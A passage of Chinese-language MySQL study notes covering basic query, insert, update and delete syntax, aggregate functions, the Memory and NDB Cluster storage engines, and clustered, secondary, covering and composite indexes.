 SELECT * FROM users WHERE NOT status = 0;
 SELECT * FROM users WHERE NOT (age < 20 OR age > 30);
 SELECT * FROM users
 WHERE (age > 25 AND status = 1) OR (age < 20 AND status = 2);
```

#### 3.2.3 范围查询

```sql
 SELECT * FROM users WHERE age BETWEEN 20 AND 30;
 SELECT * FROM users WHERE created_at BETWEEN '2024-01-01' AND '2024-12-31';
 SELECT * FROM users WHERE age NOT BETWEEN 20 AND 30;
```

#### 3.2.4 IN 和 NOT IN

```sql
 SELECT * FROM users WHERE status IN (1, 2, 3);
 SELECT * FROM users WHERE username IN ('张三', '李四', '王五');
 SELECT * FROM users WHERE id IN (SELECT user_id FROM vip_users);
 SELECT * FROM users WHERE status NOT IN (0, -1);
```

#### 3.2.5 LIKE 模糊查询

```sql
 SELECT * FROM users WHERE username LIKE '张%'; -- 以张开头
 SELECT * FROM users WHERE username LIKE '%张%'; -- 包含张
 SELECT * FROM users WHERE username LIKE '%张'; -- 以张结尾
 SELECT * FROM users WHERE username LIKE '张_'; -- 张后面一个字
 SELECT * FROM users WHERE username LIKE '__张'; -- 张前面两个字
 SELECT * FROM users WHERE phone LIKE '138%'; -- 手机号以138开头
 SELECT * FROM users WHERE email LIKE '%@gmail.com'; -- Gmail邮箱
 SELECT * FROM users WHERE username NOT LIKE '%admin%';
 SELECT * FROM users WHERE username LIKE '%100%%' ESCAPE '%';
```

#### 3.2.6 NULL 值查询

```sql
 SELECT * FROM users WHERE email IS NULL;
 SELECT * FROM users WHERE deleted_at IS NULL;
 SELECT * FROM users WHERE email IS NOT NULL;
```

#### 3.2.7 条件查询实战

```sql
 SELECT * FROM employees_info WHERE Employees_sex = '女';
 SELECT * FROM employees_info WHERE Employees_sex = '女' AND Hiredate < '2015-01-01';
 SELECT *, YEAR(NOW()) - YEAR(Hiredate) AS 工龄
 from employees_info
 WHERE YEAR(NOW()) - YEAR(Hiredate) > 15;
 SELECT * FROM employees_info WHERE Post_id BETWEEN 'cg1001' AND 'hr1001';
 SELECT * FROM employees_info WHERE Post_id IN ('cg1001', 'hr1001');
 SELECT * FROM employees_info WHERE Employees_name LIKE '%王%';
 SELECT *, YEAR(NOW()) - YEAR(Customer_Birth) AS 年龄
 from customer_info
 WHERE YEAR(NOW()) - YEAR(Customer_Birth) > 30;
 SELECT * FROM customer_info WHERE Customer_Birth IS NULL;
```

### 3.3 排序与分页详解

#### 3.3.1 ORDER BY 排序

```sql
 SELECT * FROM users ORDER BY age ASC;
 SELECT * FROM users ORDER BY age; -- 默认升序
 SELECT * FROM users ORDER BY created_at DESC;
 SELECT * FROM users ORDER BY status ASC, age DESC;
 SELECT *, age * 365 AS days_alive FROM users ORDER BY days_alive DESC;
 SELECT *, price * quantity AS subtotal FROM order_items ORDER BY subtotal DESC;
 SELECT id, username, email FROM users ORDER BY 3; -- 按第3列排序
```

#### 3.3.2 LIMIT 分页

```sql
 SELECT * FROM users LIMIT 10;
 SELECT * FROM users LIMIT 10 OFFSET 10;
 SELECT * FROM users LIMIT 10, 10; -- 简写形式
 SELECT * FROM users ORDER BY id DESC LIMIT 5;
 SELECT * FROM users ORDER BY id LIMIT 10 OFFSET 0;
 SELECT * FROM users ORDER BY id LIMIT 10 OFFSET 10;
 SELECT * FROM users ORDER BY id LIMIT 10 OFFSET 20;
 SELECT * FROM users LIMIT 1;
```

### 3.4 分组查询详解

#### 3.4.1 GROUP BY 基础

```sql
 SELECT status, COUNT(*) AS count FROM users GROUP BY status;
 SELECT province, city, COUNT(*) AS count FROM users GROUP BY province, city;
 SELECT status, AVG(age) AS avg_age FROM users GROUP BY status;
 SELECT status, SUM(balance) AS total_balance FROM users GROUP BY status;
```

#### 3.4.2 HAVING 子句

HAVING 用于过滤分组后的结果，WHERE 用于过滤分组前的记录。

```sql
 SELECT status, COUNT(*) AS count
 from users
 GROUP BY status
 HAVING count > 10;
 SELECT status, AVG(age) AS avg_age, COUNT(*) AS count
 from users
 WHERE age > 0 -- 先过滤
 GROUP BY status -- 再分组
 HAVING count > 5; -- 最后过滤分组结果
 SELECT status, COUNT(*) AS count, AVG(age) AS avg_age
 from users
 GROUP BY status
 HAVING count > 10 AND avg_age > 25;
```

#### 3.4.3 GROUP BY 实战

```sql
 SELECT COUNT(Customer_name) AS 人数, Customer_sex AS 性别
 from customer_info GROUP BY Customer_sex;
 SELECT Commodity_id, SUM(Sales_Number) AS 总数
 from sales_list GROUP BY Commodity_id;
 SELECT Commodity_id, AVG(Sales_price) AS 平均售价
 from sales_list
 GROUP BY Commodity_id
 HAVING AVG(Sales_price) > 1500;
 SELECT Commodity_id, SUM(Sales_Number) AS 总数量
 from sales_list
 GROUP BY Commodity_id
 HAVING SUM(Sales_Number) > 50;
```

#### 3.4.4 GROUP BY 注意事项

```sql
 SELECT status, COUNT(*) FROM users GROUP BY status;
 SELECT ANY_VALUE(id), status, COUNT(*) FROM users GROUP BY status;
```

### 3.5 聚合函数详解

#### 3.5.1 常用聚合函数

| 函数         | 说明       | 示例                                             |
| :----------- | :--------- | :----------------------------------------------- |
| COUNT        | 计数       | COUNT(\*)、COUNT(column)、COUNT(DISTINCT column) |
| SUM          | 求和       | SUM(price)、SUM(quantity)                        |
| AVG          | 平均值     | AVG(price)                                       |
| MAX          | 最大值     | MAX(price)、MAX(created_at)                      |
| MIN          | 最小值     | MIN(price)、MIN(created_at)                      |
| GROUP_CONCAT | 拼接字符串 | GROUP_CONCAT(username SEPARATOR ',')             |

#### 3.5.2 COUNT 用法

```sql
 SELECT COUNT(*) FROM users;
 SELECT COUNT(email) FROM users;
 SELECT COUNT(DISTINCT status) FROM users;
 SELECT COUNT(DISTINCT province, city) FROM users;
```

#### 3.5.3 聚合函数综合示例

```sql
 SELECT SUM(Purchase_price * Purchase_Number) AS 总成本 FROM purchase_list;
 SELECT
  AVG(Purchase_Number) AS 平均采购数量,
  MAX(Purchase_Number) AS 最大采购数量,
  MIN(Purchase_Number) AS 最小采购数量
 from purchase_list;
 SELECT
  Purchase_id,
  SUM(Purchase_Number) AS 总量,
  AVG(Purchase_Number) AS 平均,
  MAX(Purchase_Number) AS 最大,
  MIN(Purchase_Number) AS 最小
 from purchase_list
 GROUP BY Purchase_id;
```

---

## 插入数据

**单行写法：指定列插入单行**
`INSERT INTO <表名> (<列名>[, <列名>...]) VALUES (<值>[, <值>...])`
```sql
-- 指定列插入单行数据
INSERT INTO users (id, username, email, password, age)
VALUES (1, '张三', 'zhangsan@example.com', 'encrypted_pass', 25);
```

**单行写法：省略自增列插入**
`INSERT INTO <表名> (<非自增列>[, ...]) VALUES (<值>[, ...])`
```sql
-- 省略自增主键列插入数据
INSERT INTO users (username, email, password, age)
VALUES ('张三', 'zhangsan@example.com', 'encrypted_pass', 25);
```

**换行写法：SET 语法插入**
`INSERT INTO <表名> SET <列名> = <值>[, <列名> = <值>...]`
```sql
-- 使用 SET 形式插入数据
INSERT INTO users SET
  username = '李四',
  email = 'lisi@example.com',
  password = 'encrypted_pass',
  age = 30;
```

**换行写法：批量插入多行**
`INSERT INTO <表名> (<列名>) VALUES (<值1>), (<值2>)[, ...]`
```sql
-- 批量插入多行数据
INSERT INTO users (username, email, password, age) VALUES
('王五', 'wangwu@example.com', 'pass1', 28),
('赵六', 'zhaoliu@example.com', 'pass2', 32),
('钱七', 'qianqi@example.com', 'pass3', 27);
```

**换行写法：插入查询结果**
`INSERT INTO <表名> (<列名>) SELECT <列名> FROM <源表> [WHERE <条件>]`
```sql
-- 从旧表迁移符合条件的数据
INSERT INTO users (username, email, password, age)
SELECT username, email, password, age FROM old_users WHERE status = 1;
```

**换行写法：插入或更新**
`INSERT INTO <表名> (<列名>) VALUES (<值>) ON DUPLICATE KEY UPDATE <列名> = <值>`
```sql
-- 主键冲突时更新指定字段
INSERT INTO users (id, username, email) VALUES (1, '张三', 'new@example.com')
ON DUPLICATE KEY UPDATE email = 'new@example.com', updated_at = NOW();
```

**单行写法：忽略冲突插入**
`INSERT IGNORE INTO <表名> (<列名>) VALUES (<值>)`
```sql
-- 主键冲突时跳过插入
INSERT IGNORE INTO users (username, email) VALUES ('张三', 'test@example.com');
```

**单行写法：替换插入**
`REPLACE INTO <表名> (<列名>) VALUES (<值>)`
```sql
-- 主键冲突时删除原行再插入
REPLACE INTO users (id, username, email) VALUES (1, '张三', 'new@example.com');
```

**单行写法：获取自增 ID**
`SELECT LAST_INSERT_ID();`
```sql
-- 插入后获取自增主键值
SELECT LAST_INSERT_ID();
```

---

## 更新数据

**单行写法：更新单列**
`UPDATE <表名> SET <列名> = <值> WHERE <条件>`
```sql
-- 更新指定行的单列
UPDATE users SET age = 26 WHERE id = 1;
```

**单行写法：基于原值更新**
`UPDATE <表名> SET <列名> = <列名> <运算符> <值> WHERE <条件>`
```sql
-- 基于原值进行累加更新
UPDATE users SET age = age + 1 WHERE age < 30;
```

**换行写法：多列更新**
`UPDATE <表名> SET <列名> = <值>[, <列名> = <值>...] WHERE <条件>`
```sql
-- 同时更新多个字段
UPDATE users
SET age = 27, email = 'new@example.com', updated_at = NOW()
WHERE id = 1;
```

**换行写法：JOIN 关联更新**
`UPDATE <表1> [AS <别名>] JOIN <表2> [AS <别名>] ON <条件> SET <列名> = <值>`
```sql
-- 关联其他表更新数据
UPDATE users u
JOIN user_profiles p ON u.id = p.user_id
SET u.avatar = p.avatar_url, u.status = p.status
WHERE u.id = 1;
```

**换行写法：子查询更新**
`UPDATE <表名> SET <列名> = (SELECT <聚合> FROM <表> WHERE <条件>)`
```sql
-- 用子查询结果更新字段
UPDATE users
SET balance = (SELECT SUM(amount) FROM orders WHERE user_id = users.id)
WHERE id = 1;
```

---

## 删除数据

**单行写法：条件删除**
`DELETE FROM <表名> WHERE <条件>`
```sql
-- 删除符合条件的行
DELETE FROM users WHERE id = 1;
```

**单行写法：范围删除**
`DELETE FROM <表名> WHERE <条件1> AND <条件2>`
```sql
-- 删除符合多条件的行
DELETE FROM users WHERE status = 0 AND created_at < '2024-01-01';
```

**单行写法：排序后删除指定行数**
`DELETE FROM <表名> ORDER BY <列名> [ASC|DESC] LIMIT <行数>`
```sql
-- 按排序删除前 N 行
DELETE FROM users ORDER BY created_at DESC LIMIT 10;
```

**换行写法：JOIN 关联删除**
`DELETE <别名> FROM <表1> [AS <别名>] JOIN <表2> [AS <别名>] ON <条件> WHERE <条件>`
```sql
-- 关联其他表删除数据
DELETE u FROM users u
JOIN inactive_users i ON u.email = i.email
WHERE u.status = 0;
```

**换行写法：子查询删除**
`DELETE FROM <表名> WHERE <列名> IN (SELECT <列名> FROM <表> WHERE <条件>)`
```sql
-- 用子查询结果删除数据
DELETE FROM users WHERE id IN (SELECT user_id FROM old_users WHERE created_at < '2023-01-01');
```

**单行写法：清空表**
`TRUNCATE TABLE <表名>`
```sql
-- 清空表数据并重置自增值
TRUNCATE TABLE users;
```

---

## 基础查询

**单行写法：查询所有列**
`SELECT * FROM <表名>`
```sql
-- 查询表中所有字段
SELECT * FROM users;
```

**单行写法：查询指定列**
`SELECT <列名>[, <列名>...] FROM <表名>`
```sql
-- 查询指定列数据
SELECT id, username, email FROM users;
```

**单行写法：列别名**
`SELECT <列名> [AS] <别名>`
```sql
-- 使用别名查询字段
SELECT username AS name, email AS "邮箱地址" FROM users;
```

**单行写法：计算列别名**
`SELECT <表达式> AS <别名>`
```sql
-- 计算列并设置别名
SELECT price, quantity, price * quantity AS total FROM order_items;
```

**单行写法：单列去重**
`SELECT DISTINCT <列名> FROM <表名>`
```sql
-- 查询单列去重结果
SELECT DISTINCT status FROM users;
```

**单行写法：多列去重**
`SELECT DISTINCT <列名1>, <列名2>[, ...] FROM <表名>`
```sql
-- 查询多列组合去重结果
SELECT DISTINCT province, city FROM addresses;
```

---

## 条件查询

**单行写法：大于比较**
`WHERE <列名> > <值>`
```sql
-- 查询年龄大于 25 的用户
SELECT * FROM users WHERE age > 25;
```

**单行写法：大于等于比较**
`WHERE <列名> >= <值>`
```sql
-- 查询年龄大于等于 25 的用户
SELECT * FROM users WHERE age >= 25;
```

**单行写法：小于比较**
`WHERE <列名> < <值>`
```sql
-- 查询年龄小于 30 的用户
SELECT * FROM users WHERE age < 30;
```

**单行写法：不等于比较**
`WHERE <列名> <!=|<>> <值>`
```sql
-- 查询年龄不等于 25 的用户
SELECT * FROM users WHERE age != 25;
```

**单行写法：AND 逻辑与**
`WHERE <条件1> AND <条件2>`
```sql
-- 查询同时满足多条件的用户
SELECT * FROM users WHERE age > 25 AND status = 1;
```

**单行写法：OR 逻辑或**
`WHERE <条件1> OR <条件2>`
```sql
-- 查询满足任一条件的用户
SELECT * FROM users WHERE status = 1 OR status = 2;
```

**单行写法：NOT 逻辑非**
`WHERE NOT <条件>`
```sql
-- 查询不满足条件的用户
SELECT * FROM users WHERE NOT status = 0;
```

**换行写法：括号组合条件**
`WHERE (<条件1> AND <条件2>) OR (<条件3> AND <条件4>)`
```sql
-- 使用括号组合复杂条件
SELECT * FROM users
WHERE (age > 25 AND status = 1) OR (age < 20 AND status = 2);
```

**单行写法：数值范围查询**
`WHERE <列名> [NOT] BETWEEN <起始> AND <结束>`
```sql
-- 查询年龄在 20 到 30 之间的用户
SELECT * FROM users WHERE age BETWEEN 20 AND 30;
```

**单行写法：日期范围查询**
`WHERE <日期列> BETWEEN '<起始日期>' AND '<结束日期>'`
```sql
-- 查询指定日期范围内的用户
SELECT * FROM users WHERE created_at BETWEEN '2024-01-01' AND '2024-12-31';
```

**单行写法：IN 多值匹配**
`WHERE <列名> [NOT] IN (<值1>, <值2>[, ...])`
```sql
-- 查询状态为指定值的用户
SELECT * FROM users WHERE status IN (1, 2, 3);
```

**单行写法：IN 子查询**
`WHERE <列名> IN (SELECT <列名> FROM <表名>)`
```sql
-- 查询属于 VIP 用户表的用户
SELECT * FROM users WHERE id IN (SELECT user_id FROM vip_users);
```

**单行写法：前缀模糊查询**
`WHERE <列名> [NOT] LIKE '<前缀>%'`
```sql
-- 查询以指定字符开头的用户名
SELECT * FROM users WHERE username LIKE '张%';
```

**单行写法：包含模糊查询**
`WHERE <列名> LIKE '%<子串>%'`
```sql
-- 查询包含指定字符的用户名
SELECT * FROM users WHERE username LIKE '%张%';
```

**单行写法：单字符匹配模糊查询**
`WHERE <列名> LIKE '<前缀>_'`
```sql
-- 查询指定前缀加单字符的用户名
SELECT * FROM users WHERE username LIKE '张_';
```

**单行写法：指定转义符模糊查询**
`WHERE <列名> LIKE '<模式>' ESCAPE '<转义符>'`
```sql
-- 使用指定转义符查询包含百分号的数据
SELECT * FROM users WHERE username LIKE '%100\%%' ESCAPE '\';
```

**单行写法：查询空值**
`WHERE <列名> IS NULL`
```sql
-- 查询邮箱为空的用户
SELECT * FROM users WHERE email IS NULL;
```

**单行写法：查询非空值**
`WHERE <列名> IS NOT NULL`
```sql
-- 查询已删除的用户
SELECT * FROM users WHERE deleted_at IS NOT NULL;
```

---

## 排序与分页

**单行写法：升序排序**
`ORDER BY <列名> ASC`
```sql
-- 按年龄升序排序
SELECT * FROM users ORDER BY age ASC;
```

**单行写法：降序排序**
`ORDER BY <列名> DESC`
```sql
-- 按创建时间降序排序
SELECT * FROM users ORDER BY created_at DESC;
```

**单行写法：多列排序**
`ORDER BY <列名1> [ASC|DESC], <列名2> [ASC|DESC]`
```sql
-- 先按状态升序再按年龄降序排序
SELECT * FROM users ORDER BY status ASC, age DESC;
```

**单行写法：按列位置排序**
`ORDER BY <列位置序号>`
```sql
-- 按查询列的位置序号排序
SELECT id, username, email FROM users ORDER BY 3;
```

**单行写法：取前 N 行**
`LIMIT <行数>`
```sql
-- 取前 10 行数据
SELECT * FROM users LIMIT 10;
```

**单行写法：分页查询**
`LIMIT <行数> OFFSET <偏移>`
```sql
-- 查询第 2 页数据（每页 10 行）
SELECT * FROM users LIMIT 10 OFFSET 10;
```

**单行写法：分页简写形式**
`LIMIT <偏移>, <行数>`
```sql
-- 使用简写形式分页查询
SELECT * FROM users LIMIT 10, 10;
```

**单行写法：排序后取前 N 行**
`SELECT * FROM <表名> ORDER BY <列名> [DESC] LIMIT <行数>`
```sql
-- 按降序排序后取前 5 行
SELECT * FROM users ORDER BY id DESC LIMIT 5;
```

---

## 分组查询

**换行写法：单列分组统计**
`SELECT <分组列>, <聚合函数>(<列名>) FROM <表名> GROUP BY <分组列>`
```sql
-- 按状态分组统计用户数量
SELECT status, COUNT(*) AS count FROM users GROUP BY status;
```

**换行写法：多列分组统计**
`SELECT <列名1>, <列名2>, <聚合函数>(<列名>) FROM <表名> GROUP BY <列名1>, <列名2>`
```sql
-- 按省份和城市分组统计用户数量
SELECT province, city, COUNT(*) AS count FROM users GROUP BY province, city;
```

**换行写法：分组求平均值**
`SELECT <分组列>, AVG(<列名>) FROM <表名> GROUP BY <分组列>`
```sql
-- 按状态分组求平均年龄
SELECT status, AVG(age) AS avg_age FROM users GROUP BY status;
```

**换行写法：分组过滤**
`SELECT <列名> FROM <表名> GROUP BY <列名> HAVING <过滤条件>`
```sql
-- 过滤分组结果只保留数量大于 10 的组
SELECT status, COUNT(*) AS count
FROM users
GROUP BY status
HAVING count > 10;
```

**换行写法：WHERE 与 HAVING 组合**
`SELECT <列名> FROM <表名> WHERE <条件> GROUP BY <列名> HAVING <过滤条件>`
```sql
-- 先过滤行再分组最后过滤分组
SELECT status, AVG(age) AS avg_age, COUNT(*) AS count
FROM users
WHERE age > 0
GROUP BY status
HAVING count > 5 AND avg_age > 25;
```

---

## 聚合函数

**单行写法：总行数计数**
`COUNT(*)`
```sql
-- 统计表的总行数
SELECT COUNT(*) FROM users;
```

**单行写法：非空计数**
`COUNT(<列名>)`
```sql
-- 统计邮箱非空的行数
SELECT COUNT(email) FROM users;
```

**单行写法：去重计数**
`COUNT(DISTINCT <列名>)`
```sql
-- 统计状态去重后的数量
SELECT COUNT(DISTINCT status) FROM users;
```

**单行写法：求和**
`SUM(<列名>)`
```sql
-- 统计所有用户余额总和
SELECT SUM(balance) AS total_balance FROM users;
```

**单行写法：求平均值**
`AVG(<列名>)`
```sql
-- 统计用户平均年龄
SELECT AVG(age) AS avg_age FROM users;
```

**单行写法：求最大值**
`MAX(<列名>)`
```sql
-- 查询商品最高价格
SELECT MAX(price) AS max_price FROM products;
```

**单行写法：求最小值**
`MIN(<列名>)`
```sql
-- 查询商品最低价格
SELECT MIN(price) AS min_price FROM products;
```

**换行写法：分组拼接字符串**
`GROUP_CONCAT(<列名> [SEPARATOR '<分隔符>'])`
```sql
-- 按状态分组拼接用户名
SELECT status, GROUP_CONCAT(username SEPARATOR ',') AS names
FROM users GROUP BY status;
```

<!-- ============ 文档分隔线：020-mysql/011-MemoryStorageEngine.md ============ -->

## 1. Memory 概述

Memory（原名 HEAP）存储引擎将数据完全存储在内存中，适用于需要极快访问速度的临时数据。

### 1.1 核心特性

| 特性       | 说明                       |
| ---------- | -------------------------- |
| 存储       | 完全在内存中               |
| 锁粒度     | 表级锁                     |
| 事务       | 不支持                     |
| 索引       | 哈希索引（默认）/ B+树索引 |
| 持久性     | 无（服务器重启数据丢失）   |
| 最大行大小 | 约 32KB（不含 BLOB/TEXT）  |

### 1.2 创建 Memory 表

```sql
CREATE TABLE session_cache (
    session_id VARCHAR(128) PRIMARY KEY,
    user_id    BIGINT NOT NULL,
    data       VARCHAR(5000),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE = MEMORY;

-- 指定索引类型
CREATE TABLE lookup (
    id  INT PRIMARY KEY,
    key_col VARCHAR(50),
    INDEX idx_key USING BTREE (key_col)  -- B+树索引
) ENGINE = MEMORY;
```

## 2. 哈希索引 vs B+树索引

| 特性     | 哈希索引（默认） | B+树索引    |
| -------- | ---------------- | ----------- |
| 等值查找 | $O(1)$           | $O(\log n)$ |
| 范围查询 | 不支持           | 支持        |
| 排序     | 不支持           | 支持        |
| 最左前缀 | 不支持           | 支持        |
| 哈希冲突 | 可能             | 无          |

```sql
-- 默认哈希索引：适合等值查找
SELECT * FROM session_cache WHERE session_id = 'abc123';

-- B+树索引：适合范围查询
SELECT * FROM lookup WHERE key_col BETWEEN 'A' AND 'M';
```

## 3. 限制与注意事项

```sql
-- 不支持 BLOB/TEXT 列
-- 不支持行大小超过约 32KB
-- 服务器重启数据丢失
-- 不支持事务
-- 不支持外键
-- 表级锁，并发写入性能差

-- 设置最大 Memory 表大小
SET GLOBAL max_heap_table_size = 256 * 1024 * 1024;  -- 256MB
SET GLOBAL tmp_table_size = 256 * 1024 * 1024;       -- 临时表大小
```

## 4. 适用场景

```sql
-- 1. 会话缓存
CREATE TABLE session_cache (
    session_id VARCHAR(128) PRIMARY KEY,
    user_id BIGINT,
    data VARCHAR(5000)
) ENGINE = MEMORY;

-- 2. 查找表/映射表
CREATE TABLE country_codes (
    code CHAR(2) PRIMARY KEY,
    name VARCHAR(100)
) ENGINE = MEMORY;

-- 3. 中间结果缓存
-- MySQL 内部使用 Memory 引擎处理 GROUP BY、DISTINCT 等操作的临时表
```

<!-- ============ 文档分隔线：020-mysql/012-NDBCluster.md ============ -->

## 1. NDB Cluster 概述

MySQL NDB Cluster 是 MySQL 的高可用、高冗余分布式存储引擎，基于 NDB（Network DataBase）存储引擎，提供 99.999% 可用性。

### 1.1 核心特性

| 特性     | 说明                               |
| -------- | ---------------------------------- |
| 分布式   | 数据自动分片到多个数据节点         |
| 高可用   | 无单点故障，自动故障转移           |
| 事务     | 支持 ACID 事务                     |
| 内存存储 | 数据主要存储在内存（可溢出到磁盘） |
| 同步复制 | 数据同步复制到多个节点             |
| 在线扩容 | 支持在线添加数据节点               |

### 1.2 架构组件

```mermaid
flowchart TD
    subgraph App[应用层]
        N1[SQL Node 1]
        N2[SQL Node 2]
        N3[SQL Node 3]
    end
    subgraph Net[NDB Cluster 网络]
        D1[Data Node 1]
        D2[Data Node 2]
        D3[Data Node 3]
    end
    M[Management Node 管理节点]
    N1 --> Net
    N2 --> Net
    N3 --> Net
    M --- Net
```

## 2. 三种节点类型

### 2.1 管理节点（Management Node）

```ini
# config.ini
[ndbd default]
NoOfReplicas = 2
DataMemory = 4G
IndexMemory = 1G

[ndb_mgmd]
NodeId = 1
HostName = mgm-node1

[ndb_mgmd]
NodeId = 2
HostName = mgm-node2
```

### 2.2 数据节点（Data Node）

```ini
[ndbd]
NodeId = 3
HostName = data-node1
DataDir = /var/lib/mysql-cluster

[ndbd]
NodeId = 4
HostName = data-node2
DataDir = /var/lib/mysql-cluster
```

### 2.3 SQL 节点（SQL Node）

```ini
[mysqld]
NodeId = 5
HostName = sql-node1

[mysqld]
NodeId = 6
HostName = sql-node2
```

## 3. 数据分布

### 3.1 分片（Partition）

```sql
-- NDB Cluster 自动按主键哈希分片
CREATE TABLE orders (
    order_id BIGINT PRIMARY KEY,
    user_id BIGINT,
    amount DECIMAL(10, 2)
) ENGINE = NDB;

-- 指定分区数
CREATE TABLE orders (
    order_id BIGINT PRIMARY KEY,
    user_id BIGINT,
    amount DECIMAL(10, 2)
) ENGINE = NDB PARTITION BY KEY(order_id) PARTITIONS 4;
```

### 3.2 副本与可用性

```
NoOfReplicas = 2 时：
Node Group 0: Data Node 1 (主) + Data Node 2 (备)
Node Group 1: Data Node 3 (主) + Data Node 4 (备)

任一数据节点故障，副本自动接管
```

## 4. NDB vs InnoDB

| 特性      | NDB Cluster        | InnoDB       |
| --------- | ------------------ | ------------ |
| 存储      | 内存为主           | 磁盘为主     |
| 分布式    | 原生支持           | 需中间件     |
| 事务      | 支持               | 支持         |
| JOIN 性能 | 较差（网络开销）   | 优秀（本地） |
| 外键      | 不支持             | 支持         |
| 适用场景  | 高可用、电信、游戏 | 通用 OLTP    |

## 5. 适用场景

- 电信计费系统（99.999% 可用性）
- 游戏服务器（低延迟读写）
- 实时会话管理
- 分布式缓存

<!-- ============ 文档分隔线：020-mysql/013-ClusteredIndexSecondaryIndex.md ============ -->

## 1. 聚簇索引

### 1.1 概念

聚簇索引将数据行与主键索引存储在同一棵 B+树中，叶子节点直接包含完整的行数据。InnoDB 每张表只有一个聚簇索引。

```
聚簇索引 B+树结构：
            [30|60]
           /   |    \
    [10|20|30] [40|50|60] [70|80|90]
        ↓         ↓         ↓
    → [行1][行2][行3] → [行4][行5][行6] → [行7][行8][行9] →
        叶子节点（包含完整行数据）
```

### 1.2 聚簇索引的选择

InnoDB 按以下优先级选择聚簇索引：

1. 显式定义的 PRIMARY KEY
2. 第一个 NOT NULL 的 UNIQUE KEY
3. 系统自动生成的隐藏 ROW_ID（6字节）

```sql
-- 推荐使用自增主键
CREATE TABLE users (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,  -- 聚簇索引
    name VARCHAR(100),
    email VARCHAR(200) UNIQUE
);

-- 避免使用 UUID 作为主键
-- UUID 无序，插入导致页分裂，索引碎片化
```

### 1.3 自增主键 vs UUID 主键

| 特性       | 自增主键 | UUID 主键             |
| ---------- | -------- | --------------------- |
| 插入顺序   | 顺序追加 | 随机插入              |
| 页分裂     | 极少     | 频繁                  |
| 索引碎片   | 少       | 多                    |
| 空间利用率 | 高       | 低（36字节 vs 8字节） |
| 全局唯一   | 否       | 是                    |
| 安全性     | 可预测   | 不可预测              |

## 2. 二级索引

### 2.1 概念

二级索引（非聚簇索引）的叶子节点存储主键值而非行数据。通过二级索引查找行数据需要两步：先查二级索引获取主键，再查聚簇索引获取行数据。

```
二级索引 B+树结构：
            [M|S]
           /     \
    [A|D|M]      [S|Z]
      ↓            ↓
    → [1][3][5] → [7][9] →
      叶子节点（存储主键值）
```

### 2.2 回表查询

```sql
-- 二级索引：idx_employees_name (name)
SELECT * FROM employees WHERE name = 'Alice';

-- 执行过程：
-- 1. 在 name 索引 B+树中查找 'Alice'，获取主键 id = 5
-- 2. 在聚簇索引 B+树中查找 id = 5，获取完整行数据
-- 这就是"回表"操作
```

### 2.3 回表的代价

```sql
-- 如果查询返回大量行，回表代价很高
-- 假设 name 索引选择性低，返回 10000 行
SELECT * FROM employees WHERE name = 'Alice';  -- 10000次回表

-- 优化器可能选择全表扫描而非索引 + 回表
-- 当回表代价 > 全表扫描代价时
```

## 3. 覆盖索引

### 3.1 概念

覆盖索引是指索引包含了查询所需的所有列，无需回表。

```sql
-- 创建覆盖索引
CREATE INDEX idx_employees_dept_name_salary
ON employees(dept_id, name, salary);

-- 覆盖索引查询：不需要回表
SELECT name, salary FROM employees WHERE dept_id = 5;
-- EXPLAIN 中 Extra: Using index

-- 非覆盖索引查询：需要回表
SELECT name, salary, email FROM employees WHERE dept_id = 5;
-- email 不在索引中，需要回表
```

### 3.2 覆盖索引优化场景

```sql
-- 场景1：避免回表
-- 无覆盖索引
SELECT user_id, COUNT(*) FROM orders GROUP BY user_id;
-- 需要回表获取 user_id

-- 有覆盖索引
CREATE INDEX idx_orders_user_id ON orders(user_id);
SELECT user_id, COUNT(*) FROM orders GROUP BY user_id;
-- Using index，无需回表

-- 场景2：分页查询优化
SELECT id, title FROM articles ORDER BY created_at DESC LIMIT 10000, 10;
-- 使用覆盖索引避免大量回表
CREATE INDEX idx_articles_created_id_title ON articles(created_at DESC, id, title);
```

## 4. 索引下推（ICP）

### 4.1 概念

索引条件下推（Index Condition Pushdown，ICP）将 WHERE 条件中可以在索引上评估的部分下推到存储引擎层，减少回表次数。

```sql
-- 索引 (name, age)
SELECT * FROM employees WHERE name LIKE '张%' AND age > 30;

-- 无 ICP：
-- 1. 存储引擎通过 name LIKE '张%' 找到所有主键
-- 2. 回表获取完整行
-- 3. Server 层评估 age > 30

-- 有 ICP：
-- 1. 存储引擎通过 name LIKE '张%' 找到索引项
-- 2. 在索引中直接评估 age > 30（age 在索引中）
-- 3. 只对满足条件的行回表
-- 减少回表次数！
```

### 4.2 ICP 开启

```sql
-- 默认开启
SET optimizer_switch = 'index_condition_pushdown=on';

-- EXPLAIN 中 Extra: Using index condition
```

## 5. 索引优化策略

### 5.1 减少回表

```sql
-- 方法1：使用覆盖索引
CREATE INDEX idx_cover ON employees(dept_id, name, salary);
SELECT name, salary FROM employees WHERE dept_id = 5;

-- 方法2：延迟关联
-- 先通过二级索引获取主键，再通过主键获取行
SELECT e.* FROM employees e
JOIN (
    SELECT id FROM employees WHERE name LIKE '张%' LIMIT 10000, 10
) tmp ON e.id = tmp.id;
```

### 5.2 避免不必要的列

```sql
-- 不推荐：SELECT *
SELECT * FROM employees WHERE dept_id = 5;

-- 推荐：只查需要的列
SELECT name, salary FROM employees WHERE dept_id = 5;
-- 可能命中覆盖索引
```

<!-- ============ 文档分隔线：020-mysql/014-CompositeIndexLeftmostPrefixPrinciple.md ============ -->

## 1. 联合索引结构

联合索引（复合索引）是在多个列上创建的索引，按照定义列的顺序在 B+树中排序。

```sql
-- 创建联合索引
CREATE INDEX idx_abc ON table_name(a, b, c);

-- B+树排序规则：
-- 先按 a 排序，a 相同按 b 排序，b 相同按 c 排序
-- 索引项：(1,1,1), (1,1,2), (1,2,1), (2,1,1), (2,2,1)
```

## 2. 最左前缀原则

### 2.1 匹配规则

联合索引 `(a, b, c)` 可以支持以下查询模式：

| WHERE 条件                | 使用索引 | 说明         |
| ------------------------- | -------- | ------------ |
| a = 1                     | a        | 最左列       |
| a = 1 AND b = 2           | a, b     | 最左两列     |
| a = 1 AND b = 2 AND c = 3 | a, b, c  | 全部列       |
| b = 2                     |          | 跳过最左列   |
| c = 3                     |          | 跳过最左列   |
| b = 2 AND c = 3           |          | 跳过最左列   |
| a = 1 AND c = 3           | a        | 跳过中间列 b |

### 2.2 范围查询中断

```sql
-- 索引 (a, b, c)

-- 范围查询后的列无法使用索引
WHERE a > 1 AND b = 2       -- 只用 a，b 无法用索引
WHERE a = 1 AND b > 2 AND c = 3  -- 用 a, b，c 无法用索引
